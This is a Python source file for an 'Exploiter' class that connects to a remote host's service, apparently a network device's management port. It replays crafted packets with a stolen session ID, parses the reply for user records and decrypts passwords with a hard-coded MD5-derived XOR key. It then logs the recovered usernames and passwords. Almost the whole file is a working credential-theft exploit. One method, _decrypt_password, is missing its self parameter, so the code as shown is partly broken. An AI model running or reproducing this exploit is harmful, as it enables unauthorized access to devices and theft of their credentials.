from socket import socket
import hashlib
from loguru import logger
from typing import List, Tuple
from app.templates import hello, template


class Exploiter:
    def __init__(self, address: str, port: int):
        self.connection = socket()
        self.connection.settimeout(5)
        self.address = address
        self.port = port

    def _connect(self):
        try:
            self.connection.connect((self.address, self.port))
        except Exception as error:
            logger.error(f"Connection error: {error}")
            self.connection.close()

    def _get_session_id(self) -> bytearray:
        self.connection.send(hello)
        try:
            session_id = bytearray(self.connection.recv(1024))
            return session_id
        except Exception as error:
            logger.error(f"Can't get session id! Error: {error}")
            self.connection.close()
    
    def _send_edited_response(self, session_id: bytearray) -> bytearray:
        template[19] = session_id[38]
        try:
            self.connection.send(template)
            return bytearray(self.connection.recv(1024))
        except Exception as error:
            logger.error(f"Can't send edited response! Error: {error}")
    
    def _decrypt_password(user, pass_enc):
        key = hashlib.md5(user + b"283i4jfkai3389").digest()
        passw = ""
        for i in range(0, len(pass_enc)):
            passw += chr(pass_enc[i] ^ key[i % len(key)])
        return passw.split("\x00")[0]

    def _extract_user_pass_from_entry(self, entry) -> Tuple:
        user_data = entry.split(b"\x01\x00\x00\x21")[1]
        pass_data = entry.split(b"\x11\x00\x00\x21")[1]
        user_len = user_data[0]
        pass_len = pass_data[0]
        username = user_data[1 : 1 + user_len]
        password = pass_data[1 : 1 + pass_len]
        return username, password

    def _get_pair(self, data) -> List[Tuple]:
        user_list = []
        entries = data.split(b"M2")[1:]
        for entry in entries:
            try:
                user, pass_encrypted = self._extract_user_pass_from_entry(entry)
            except Exception as error:
                logger.error(f"Error while decryption username and password! {error}")
                continue
            pass_plain = self._decrypt_password(user, pass_encrypted)
            user = user.decode("utf_8", "backslashreplace")
            user_list.append((user, pass_plain))
        return user_list

    def _get_username_and_password(self, result: bytearray):
        user_pass: List[Tuple] = self._get_pair(result)
        for u, p in user_pass:
            logger.success(f"Host {self.address}:{self.port} has username: {u} and password: {p}")

    def crack(self) -> tuple:
        self._connect()
        session_id = self._get_session_id()
        if session_id is not None:
            result = self._send_edited_response(session_id=session_id)
            self._get_username_and_password(result=result)
        self.connection.close()